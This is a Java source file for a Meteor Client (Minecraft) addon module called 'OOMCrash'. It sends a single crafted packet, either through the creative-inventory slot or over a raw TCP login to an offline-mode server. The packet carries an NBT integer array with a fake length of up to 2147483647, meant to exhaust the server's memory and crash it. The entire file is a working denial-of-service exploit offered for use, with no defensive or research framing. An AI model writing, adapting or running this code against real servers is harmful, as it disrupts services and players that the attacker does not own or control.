package com.client2end.addon.modules;

import com.client2end.addon.Client2End;
import meteordevelopment.meteorclient.settings.EnumSetting;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Module;
import net.minecraft.component.DataComponentTypes;
import net.minecraft.component.type.NbtComponent;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;

import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.net.Socket;
import java.util.concurrent.atomic.AtomicBoolean;

public class OOMCrash extends Module {
    public enum Vector {
        Slot("Creative slot"),
        TCP("Raw TCP (offline mode)");

        private final String title;
        Vector(String title) { this.title = title; }
        @Override public String toString() { return title; }
    }

    private static final AtomicBoolean armed = new AtomicBoolean(false);
    private static int overrideSize = Integer.MAX_VALUE;

    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Vector> vector = sgGeneral.add(new EnumSetting.Builder<Vector>()
        .name("vector")
        .description("Delivery method")
        .defaultValue(Vector.Slot)
        .build()
    );

    private final Setting<Integer> arraySize = sgGeneral.add(new IntSetting.Builder()
        .name("array-size")
        .description("Fake NBT array length")
        .defaultValue(2147483647)
        .min(1)
        .max(2147483647)
        .sliderRange(1, 1000000000)
        .build()
    );

    public OOMCrash() {
        super(Client2End.CATEGORY, "oom-crash", "Single-packet NBT array OOM via fake length");
    }

    public static boolean isArmed() {
        return armed.getAndSet(false);
    }

    public static int getArraySize() {
        return overrideSize;
    }

    @Override
    public void onActivate() {
        switch (vector.get()) {
            case Slot -> fireSlot();
            case TCP -> fireTCP();
        }
    }

    private void fireSlot() {
        overrideSize = arraySize.get();
        armed.set(true);

        fireCreativePacket();

        info("Packet queued via creative slot. size=" + overrideSize);

        new Thread(() -> {
            try { Thread.sleep(1000); } catch (Exception e) {}
            if (armed.get()) {
                armed.set(false);
                warning("Mixin didn't fire");
            }
        }).start();

        toggle();
    }

    private void fireCreativePacket() {
        ItemStack stack = new ItemStack(Items.DIAMOND);
        NbtCompound nbt = new NbtCompound();
        nbt.putIntArray("oom", new int[]{0});
        NbtComponent.set(DataComponentTypes.CUSTOM_DATA, stack, nbt);
        mc.getNetworkHandler().sendPacket(new CreativeInventoryActionC2SPacket(1, stack));
    }

    private void fireTCP() {
        if (mc.getCurrentServerEntry() == null) {
            error("Not connected to a server");
            toggle();
            return;
        }

        String[] parts = mc.getCurrentServerEntry().address.split(":");
        String host = parts[0];
        int port = parts.length > 1 ? Integer.parseInt(parts[1]) : 25565;
        int size = arraySize.get();

        info("Connecting to " + host + ":" + port + " via raw TCP...");

        new Thread(() -> {
            try {
                doTCP(host, port, size);
                info("TCP packet sent");
            } catch (Exception e) {
                error("TCP failed: " + e.getMessage());
            }
        }).start();

        toggle();
    }

    private void doTCP(String host, int port, int fakeSize) throws Exception {
        try (Socket socket = new Socket(host, port)) {
            socket.setSoTimeout(15000);
            DataOutputStream dos = new DataOutputStream(socket.getOutputStream());

            // Handshake → LOGIN
            ByteArrayOutputStream hs = new ByteArrayOutputStream();
            DataOutputStream hOut = new DataOutputStream(hs);
            writeVarInt(hOut, 0); writeVarInt(hOut, 767);
            writeString(hOut, host); hOut.writeShort(port);
            writeVarInt(hOut, 2);
            sendFrame(dos, hs.toByteArray());

            // Login Start
            ByteArrayOutputStream ls = new ByteArrayOutputStream();
            DataOutputStream lOut = new DataOutputStream(ls);
            writeVarInt(lOut, 0); writeString(lOut, "OOM");
            sendFrame(dos, ls.toByteArray());

            // Read response (Login Success for offline mode)
            socket.getInputStream().readNBytes(6);
            int avail = socket.getInputStream().available();
            if (avail > 0) socket.getInputStream().readNBytes(avail);

            // Craft CreativeInventoryAction packet with fake NBT IntArray
            ByteArrayOutputStream data = new ByteArrayOutputStream();
            DataOutputStream dOut = new DataOutputStream(data);

            // slot
            writeVarInt(dOut, 1);
            // item present
            dOut.writeBoolean(true);
            // item ID (diamond)
            writeVarInt(dOut, 264);
            // count
            writeVarInt(dOut, 1);
            // component count
            writeVarInt(dOut, 1);
            // CUSTOM_DATA component type ID (varies - try common value)
            writeVarInt(dOut, 13);
            // NBT TAG_Compound
            dOut.writeByte(10); dOut.writeShort(0);
            // TAG_Int_Array "oom"
            dOut.writeByte(11);
            dOut.writeShort(3); dOut.write("oom".getBytes("UTF-8"));
            // FAKE LENGTH
            dOut.writeInt(fakeSize);
            // No data - OOM happens before reading elements
            dOut.writeByte(0); // TAG_End

            // Send as PLAY state packet (CreativeInventoryAction)
            // Note: packet ID may vary between versions
            ByteArrayOutputStream play = new ByteArrayOutputStream();
            DataOutputStream pOut = new DataOutputStream(play);
            writeVarInt(pOut, 45); // common CreativeInventoryAction packet ID
            pOut.write(data.toByteArray());
            sendFrame(dos, play.toByteArray());
        }
    }

    private void writeVarInt(DataOutputStream out, int value) throws Exception {
        do {
            byte temp = (byte) (value & 0x7F);
            value >>>= 7;
            if (value != 0) temp |= 0x80;
            out.writeByte(temp);
        } while (value != 0);
    }

    private void writeString(DataOutputStream out, String s) throws Exception {
        byte[] bytes = s.getBytes("UTF-8");
        writeVarInt(out, bytes.length);
        out.write(bytes);
    }

    private void sendFrame(DataOutputStream dos, byte[] data) throws Exception {
        ByteArrayOutputStream frame = new ByteArrayOutputStream();
        DataOutputStream fOut = new DataOutputStream(frame);
        writeVarInt(fOut, data.length);
        fOut.write(data);
        dos.write(frame.toByteArray());
        dos.flush();
    }
}
